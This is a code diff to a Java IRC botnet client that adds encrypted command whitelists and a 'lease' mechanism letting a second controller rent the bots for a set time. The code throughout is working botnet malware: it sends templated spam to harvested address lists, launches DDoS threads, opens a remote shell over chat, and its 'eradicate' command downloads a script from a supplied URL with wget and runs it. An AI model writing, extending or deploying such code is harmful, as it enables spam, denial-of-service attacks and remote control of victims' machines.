@@ -21,6 +21,9 @@ import org.jibble.pircbot.*;
 
 
 public class BotnetClient extends PircBot {
+	private static final List<String> COMMANDS = Arrays.asList(new String[] {"kill", "eradicate", "ddos", "spam", "shell", "spamupload", "lease"});
+	private static final List<String> SAFE_COMMANDS =  Arrays.asList(new String[] {"help", "names", "ddos", "spam", "spamupload"});
+	
 	private static final String SENTINEL = "$: ";
 	private static final String TERMINATION = "exit";
 	private static final boolean DEBUG = true;
@@ -37,12 +40,12 @@ public class BotnetClient extends PircBot {
 	
 	private MsgEncrypt m;
 	
-	private String rsaMod = "101303910710900226274349030555647780242601234001053700242140440355421711719614388158299014962476550026734960750908999517650997683806704967780217503081010517989368347136612497678731041194040683080313069165522077936751386218907487890298947166101897033800426412821219973850448264931913696365980503099134782271671";
-	private String rsaPublicExp = "65537";
+	private static final String rsaMod = "101303910710900226274349030555647780242601234001053700242140440355421711719614388158299014962476550026734960750908999517650997683806704967780217503081010517989368347136612497678731041194040683080313069165522077936751386218907487890298947166101897033800426412821219973850448264931913696365980503099134782271671";
+	private static final String rsaPublicExp = "65537";
 	
 	private boolean leased = false;
-	private int TIME = 3000; // Time in milliseconds
-	private long startTime;
+	private String leaseMaster = null;
+	private long leaseTerminateTime;
 	private MsgEncrypt leasedM; // This will be set to null when time is up
 	
 	public static void main(String[] args) {
@@ -52,7 +55,6 @@ public class BotnetClient extends PircBot {
 	public BotnetClient() {
 		m = MsgEncrypt.getInstance();
 		m.genRSAPubKey(rsaMod + " " + rsaPublicExp);
-		System.out.println("public key is: " + m.getRSAPub());
 		uuid = UUID.randomUUID().toString();
 		id = NAME + "_" + uuid;
 		try {
@@ -92,78 +94,108 @@ public class BotnetClient extends PircBot {
 	}
 		
 	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
-		if (sender.equals(CC)) {
-			try {
-				// TODO: maybe need to put this back
-				//System.out.println(message);
-				message = m.decryptMsg(message);
-				//System.out.println(message);
-				if (message.toLowerCase().startsWith("spam")) {
-					String[] parts = message.split("'");
-					if (parts.length < 9) {
-						System.out.println("bad spam message: " + message);
-					} else {
-						String x = parts[1];
-						String y = parts[3];
-						String z = parts[5];
-						String subject = parts[7];
-						String emails = parts[8].trim();
-						
-						String[] to;
-						if (emails.toLowerCase().equals("random")) {
-							to = getEmails(RANDOM_EMAILS);
-						} else if (emails.toLowerCase().equals("all")) {
-							to = getEmails(EMAILS);
-						} else {
-							to = emails.split(" ");
-						}
-						String body = "";
-						try {
-							Scanner in = new Scanner(new File(TEMPLATE));
-							while (in.hasNextLine()) {
-								body += in.nextLine() + "\n";
-							}
-						} catch (Exception e) {
-							System.out.println("There were problems reading " + TEMPLATE);
-						}
-						body = body.replace("XXX", x).replace("YYY", y).replace("ZZZ", z);
-						sendEmail(to, subject, body);
-					}
-				} else if (message.toLowerCase().startsWith("ddos")) {
-					System.out.println(sender + ": " + message);
-					String[] parts = message.split(" ");
-					if (parts.length < 4) {
-						System.out.println("Bad ddos message provided");
-					} else {
-						DdosThread ddos = new DdosThread(parts[1], Integer.parseInt(parts[2]), Integer.parseInt(parts[3]));
-					}
-				} else if (message.toLowerCase().startsWith("lease")) {
-					System.out.println("Leasing Myself");
-				} else if (message.toLowerCase().startsWith("eradicate")) {
-					String[] parts = message.split(" ");
-					if (parts.length > 1) {
-						String url = parts[1];
-						Process p = Runtime.getRuntime().exec("/bin/sh");
-						PrintWriter in = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
-						in.println("wget -O clean.sh " + url + " >> temp");
-						in.println("chmod +x clean.sh >> temp");
-						in.println("./clean.sh >> temp");
-						in.println("exit 0");
-						p.waitFor();
-						System.out.println("ran clean script with exit code " + p.exitValue());
-						System.exit(0);
-					}
-				} else if (message.toLowerCase().startsWith("kill")) {
-					System.exit(0);	
-				} else {
-					System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
-				}
-			} catch (Exception e) {
-				e.printStackTrace();
-				System.out.println("There was problems decrypting the message");
-			}
+		if (leased && System.currentTimeMillis() > leaseTerminateTime) {
+			leased = false;
+			leaseTerminateTime = 0;
+			leasedM = null;
+			leaseMaster = null;
+		}
+		String decMsg = m.decryptMsg(message);
+		String leasedDecMsg = leased ? leasedM.decryptMsg(message) : null;
+		if (sender.equals(CC) && COMMANDS.contains(decMsg.split(" ")[0])) {
+			runCommand(decMsg, hostname, sender);
+		} else if (leaseMaster != null && sender.equals(leaseMaster) && SAFE_COMMANDS.contains(leasedDecMsg.split(" ")[0])) {
+			runCommand(leasedDecMsg, hostname, sender);
 		} else { // TODO: use leasing here??
 			System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
+		}
+	}
+	
+	private boolean runCommand(String message, String hostname, String sender) {
+		try {
+			// TODO: maybe need to put this back
+			//System.out.println(message);
+			//System.out.println(message);
+			if (message.toLowerCase().startsWith("spam")) {
+				String[] parts = message.split("'");
+				if (parts.length < 9) {
+					System.out.println("bad spam message: " + message);
+				} else {
+					String x = parts[1];
+					String y = parts[3];
+					String z = parts[5];
+					String subject = parts[7];
+					String emails = parts[8].trim();
+					
+					String[] to;
+					if (emails.toLowerCase().equals("random")) {
+						to = getEmails(RANDOM_EMAILS);
+					} else if (emails.toLowerCase().equals("all")) {
+						to = getEmails(EMAILS);
+					} else {
+						to = emails.split(" ");
+					}
+					String body = "";
+					try {
+						Scanner in = new Scanner(new File(TEMPLATE));
+						while (in.hasNextLine()) {
+							body += in.nextLine() + "\n";
+						}
+					} catch (Exception e) {
+						System.out.println("There were problems reading " + TEMPLATE);
+					}
+					body = body.replace("XXX", x).replace("YYY", y).replace("ZZZ", z);
+					sendEmail(to, subject, body);
+				}
+				return true;
+			} else if (message.toLowerCase().startsWith("ddos")) {
+				System.out.println(sender + ": " + message);
+				String[] parts = message.split(" ");
+				if (parts.length < 4) {
+					System.out.println("Bad ddos message provided");
+				} else {
+					DdosThread ddos = new DdosThread(parts[1], Integer.parseInt(parts[2]), Integer.parseInt(parts[3]));
+				}
+				return true;
+			} else if (message.toLowerCase().startsWith("lease")) {
+				String[] parts = message.split(" ");
+				if (parts.length > 4) {
+					String leaseMaster = parts[1];
+					long duration = Long.parseLong(parts[2]);
+					String mod = parts[3];
+					String exp = parts[4];
+					leaseTerminateTime = System.currentTimeMillis() + duration;
+					leased = true;
+					this.leaseMaster = leaseMaster;
+					leasedM = MsgEncrypt.getInstance();
+					leasedM.genRSAPubKey(mod + " " + exp);
+				} else {
+					System.out.println("Failed lease message: " + message);
+				}
+				return true;
+			} else if (message.toLowerCase().startsWith("eradicate")) {
+				String[] parts = message.split(" ");
+				if (parts.length > 1) {
+					String url = parts[1];
+					Process p = Runtime.getRuntime().exec("/bin/sh");
+					PrintWriter in = new PrintWriter(new BufferedWriter(new OutputStreamWriter(p.getOutputStream())), true);
+					in.println("wget -O clean.sh " + url + " >> temp");
+					in.println("chmod +x clean.sh >> temp");
+					in.println("./clean.sh >> temp");
+					in.println("exit 0");
+					p.waitFor();
+					System.out.println("ran clean script with exit code " + p.exitValue());
+					System.exit(0);
+				}
+				return true;
+			} else if (message.toLowerCase().startsWith("kill")) {
+				System.exit(0);	
+			}
+			return false;
+		} catch (Exception e) {
+			e.printStackTrace();
+			System.out.println("There was problems decrypting the message");
+			return false;
 		}
 	}
 	
@@ -230,18 +262,26 @@ public class BotnetClient extends PircBot {
 			System.out.println("Chat failed, passed null.");
 		} else {
 			try {
-				if (!chat.getNick().equalsIgnoreCase(CC)) {
+				if (!chat.getNick().equalsIgnoreCase(CC) && !chat.getNick().equalsIgnoreCase(leaseMaster)) {
 					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
 				} else { 
 					chat.accept();
 					String command = chat.readLine();
 					String commandRSA = m.decryptRSA(command);
+					String leasedCommandRSA = leasedM.decryptRSA(command);
 					if (commandRSA.equalsIgnoreCase("key")) {
 						String otherKey = m.decryptRSA(chat.readLine());
 						String info = m.decryptRSA(chat.readLine());
 						m.setPubParams(info);
 						m.handShake(otherKey);
 						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
+						chat.close();
+					} else if (leasedCommandRSA.equalsIgnoreCase("key")) {
+						String otherKey = leasedM.decryptRSA(chat.readLine());
+						String info = leasedM.decryptRSA(chat.readLine());
+						leasedM.setPubParams(info);
+						leasedM.handShake(otherKey);
+						chat.sendLine(leasedM.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
 						chat.close();
 					} else if (m.decryptMsg(command).equalsIgnoreCase("shell")) {
 						//Create the bash shell
